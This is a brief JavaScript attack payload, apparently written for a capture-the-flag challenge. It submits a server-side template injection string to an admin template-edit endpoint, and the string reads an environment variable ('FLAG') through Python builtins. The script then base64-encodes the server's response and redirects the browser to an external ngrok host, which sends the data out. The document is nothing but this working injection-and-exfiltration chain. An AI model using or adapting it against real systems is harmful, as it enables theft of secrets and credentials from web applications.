fetch("/admin/templates/1/edit", {
  method: "POST",
  body: "name=Default+Ticket+Template&html_content=" +
    encodeURIComponent("testaa<h1>{{ event_name }}</h1><p>{{ buyer_name }}</p><p>{{ ticket_code }} {{ self.__init__.__globals__.__builtins__.__import__('os').environ['FLAG'] }}bagr7</p>") +
    "&is_default=on",
  headers: {
    "content-type": "application/x-www-form-urlencoded"
  }
}).then(async (resp) => {
    const status = resp.status;
    const text = await resp.text();
    const headers = [...resp.headers];
    const url = resp.url;
    document.location = 'https://eaf3-195-113-197-234.ngrok-free.app/' + new TextEncoder().encode(JSON.stringify(
        {text, headers, url, status})).toBase64()
})
